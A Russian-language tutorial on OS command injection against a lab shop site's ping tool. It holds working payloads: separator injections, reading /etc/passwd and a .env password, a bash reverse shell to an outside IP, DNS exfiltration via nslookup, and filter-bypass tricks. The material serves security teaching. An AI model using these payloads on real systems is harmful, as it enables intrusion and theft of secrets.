## Задача

Мы хотим выполнить **свою** команду на сервере. Не «прочитать базу», а именно запустить `id`, `cat`, а в идеале — получить полноценный доступ к оболочке. Ищем место, где приложение само запускает системную команду.

## Данные, с которыми работаем

На `shop.local` есть страница «проверить доступность магазина»: админ вводит домен, а сервер пингует его.

```bash
$ curl -s 'https://shop.local/admin/tools/ping?host=shop.local'
PING shop.local (127.0.0.1) 56(84) bytes of data.
64 bytes from localhost: icmp_seq=1 ttl=64 time=0.043 ms
```

Под капотом почти наверняка:

```php
system("ping -c 1 " . $_GET['host']);
```

Значение `host` **приклеивается** к команде. Это и есть **инъекция команд ОС** (command injection): ввод пользователя попадает в строку, которую исполняет оболочка, и может добавить туда вторую команду.

## Пробуем в лоб: разделитель `;`

В оболочке команды разделяются символами `;`, `&&`, `|`, `||`, `` ` ``, `$()`. Добавим `;id`:

```bash
$ curl -s 'https://shop.local/admin/tools/ping?host=127.0.0.1;id'
PING 127.0.0.1 (127.0.0.1) ...
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

В ответе — результат `id`. Мы выполнили свою команду. Вывод `uid=33(www-data)` — это уже **доказательство** (артефакт): мы знаем пользователя, под которым работает приложение.

Если бы `;` заблокировали, работали бы `&&`, `|`, `%0a` (перевод строки), обратные кавычки `` `id` `` или `$(id)`.

## Что дают разные разделители

Каждый ведёт себя по-своему, и это важно при обходе фильтров:

- `;id` — выполнить `id` после `ping` независимо от его успеха.
- `|id` — передать вывод `ping` на вход `id` (часто ломается, но сам `id` выполняется).
- `||id` — выполнить `id`, только если `ping` упал.
- `&&id` — выполнить `id`, только если `ping` успешен.
- `` `id` `` или `$(id)` — подстановка вывода прямо в строку.

Начни с `;`, но держи в запасе все пять.

## Полный прогон: от `id` до чтения файлов

Раз мы исполняем команды, посмотрим систему:

```bash
$ curl -s 'https://shop.local/admin/tools/ping?host=127.0.0.1;cat /etc/passwd'
root:x:0:0:root:/root:/bin/bash
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
```

Читаем конфиг приложения с паролем к базе:

```bash
$ curl -s 'https://shop.local/admin/tools/ping?host=127.0.0.1;cat /var/www/html/.env'
DB_HOST=localhost
DB_USER=shop
DB_PASS=S3cr3tShopPass
```

Дальше — постоянный доступ. Простейший обратный шелл:

```bash
$ curl -s 'https://shop.local/admin/tools/ping?host=127.0.0.1;bash -c "bash -i >%26 /dev/tcp/10.10.14.7/4444 0>%261"'
# на нашей машине: nc -lvnp 4444
connect to [10.10.14.7] from shop.local [10.0.0.5]
www-data@shop:/var/www/html$ id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

Обрати внимание на `%26` — это URL-кодированный `&`, иначе оболочка `curl` перехватит его сама. В браузере и Burp кодировать не нужно, а вот в командной строке — обязательно.

## Если вывода нет: blind

Часто приложение не показывает результат команды. Тогда играем «вслепую». Первый приём — задержка:

```bash
$ time curl -s 'https://shop.local/admin/tools/ping?host=127.0.0.1;sleep 5'
real    0m5.1s
```

Пять секунд паузы — команда выполнилась. Дальше можно «вытаскивать» данные через задержку, например проверять существование файла:

```bash
$ curl -s 'https://shop.local/admin/tools/ping?host=127.0.0.1;[ -f /etc/passwd ] && sleep 5'
# задержка есть → файл существует
```

Второй приём — **out-of-band (OOB)**: заставить сервер постучаться к нам. Вешаем слушатель и просим сервер разрешить имя:

```bash
# на нашей машине
$ sudo tcpdump -ni any udp port 53
$ curl -s 'https://shop.local/admin/tools/ping?host=127.0.0.1;nslookup $(whoami).10.10.14.7.nip.io'
# в tcpdump видно DNS-запрос с 'www-data' — команда выполнилась
```

Так подтверждают инъекцию, даже когда сервер молчит и не задерживается (например, при асинхронной обработке).

## Если не сработало: обход фильтров

Фильтры ловят пробелы, слеши и точки. Обходы:

- **Пробел заблокирован** → `${IFS}`, `%09` (таб), `$IFS$9`, `<` : `cat${IFS}/etc/passwd`.
- **`/` заблокирован** → `${PATH:0:1}` или `$PWD`-трюки: `cat${IFS}${PATH:0:1}etc${IFS}${PATH:0:1}passwd`.
- **Кавычки заблокированы** → `c'a't`, `c"a"t` или base64: `echo Y2F0IC9ldGMvcGFzc3dk|base64${IFS}-d|sh`.
- **Слова `cat`/`id` в чёрном списке** → используй другой путь: `/bin/cat`, `/usr/bin/id`, `$'\x63\x61\x74'`.
- **Проверка на «ping только»** → добавь ожидаемый префикс: `127.0.0.1;id`.

Автоматизировать перебор payload'ов помогает **commix**:

```bash
$ commix -u 'https://shop.local/admin/tools/ping?host=127.0.0.1' --batch
[+] The GET parameter 'host' is vulnerable to command injection
```

## Как вытащить данные вслепую, посимвольно

Когда даже OOB недоступен, а сервер только «задерживается», данные извлекают **по времени**, символ за символом. Идея: сравнивать и проверять предикат, который либо спит, либо нет. Например, читаем первый символ файла:

```bash
# спит, если первый символ 'r'
$ time curl -s 'https://shop.local/admin/tools/ping?host=127.0.0.1;[ "$(head -c1 /etc/passwd)" = "r" ] && sleep 3'
real    0m3.1s     # -> первый символ 'r'
```

Перебирая возможные символы и позиции, восстанавливают содержимое файла целиком. Это медленно (по одному запросу на символ), поэтому так добывают только самое ценное — флаг или пароль, — а не весь файл. Быстрее — через OOB, где данные уходят в поддомен DNS-запроса:

```bash
$ curl -s 'https://shop.local/admin/tools/ping?host=127.0.0.1;nslookup $(cat /etc/hostname).10.10.14.7.nip.io'
```

## Argument injection — когда оболочки нет

Иногда приложение не запускает shell, а передаёт аргументы напрямую в программу (например, `git`, `curl`, `tar`). Тогда `;id` не сработает, но можно подсунуть **флаг** программы: скажем, `curl` с `-o /var/www/html/shell.php` скачает наш файл и запишет его в webroot. Признак — параметр влияет на аргументы, но разделители не работают.

## Что мы теперь знаем

- Command injection возникает, когда ввод склеивают с командой, а не передают отдельным аргументом.
- Разделители `;` `&&` `||` `|` `` ` `` `$()` позволяют добавить свою команду.
- Вывод `id`/`/etc/passwd` — прямое доказательство; обратный шелл даёт постоянный доступ.
- Если вывода нет — работают time-blind (`sleep`) и OOB (`nslookup` к нашему слушателю).
- Фильтры пробелов/слешей/кавычек обходятся `${IFS}`, `${PATH:0:1}`, `$'\x..'`, base64.
- Без shell бывает **argument injection** — подсовываем флаги самой программе.
- Правильное решение — `execve` с массивом аргументов (без оболочки) и белый список значений.

## На что смотреть дальше

- Ищи точки, где приложение вызывает внешние утилиты: ping/traceroute, конвертация файлов (imagemagick, ffmpeg), git/svn, отправка писем, PDF-генераторы.
- Проверяй не только `host`, но и параметры, которые «уходят» в аргументы: имя выходного файла, формат, URL.
- Строй обратный шелл через `bash`, `python3`, `nc`, `socat` — если один бинарник недоступен, попробуй другой.
- Не забывай про кодирование: `&` в URL — `%26`, пробел — `%20`/`+`.
- Различай **shell** и **no-shell** вызовы: если приложение использует `execve` с массивом аргументов, метасимволы (`;`, `|`) не сработают — тогда пробуй argument injection (флаги самой программы). Признак: ввод явно влияет на аргументы (путь, формат, URL), но разделители команд игнорируются.

## Куда дальше

В следующем уроке мы поднимем ставку: вместо того чтобы просить сервер **выполнить** нашу команду, мы заставим его **загрузить наш файл** и получить выполнение кода постоянно — через webshell. А пока главное запомни: если ввод склеен с командой ОС, ты можешь добавить туда свою.

## Где пригодится

- **CTF (Web):** command injection — прямой путь к чтению `flag.txt` и получению шелла; часто в админ-утилитах.
- **Bug bounty:** RCE-класс, максимальные выплаты; часто спрятан в конвертерах и «проверках».
- **Пентест:** приоритетная цель — от неё до полного контроля над сервером один шаг.
- **Работа (AppSec):** ревью вызовов `system`/`exec`/`child_process` и переход на безопасные API — базовая гигиена.
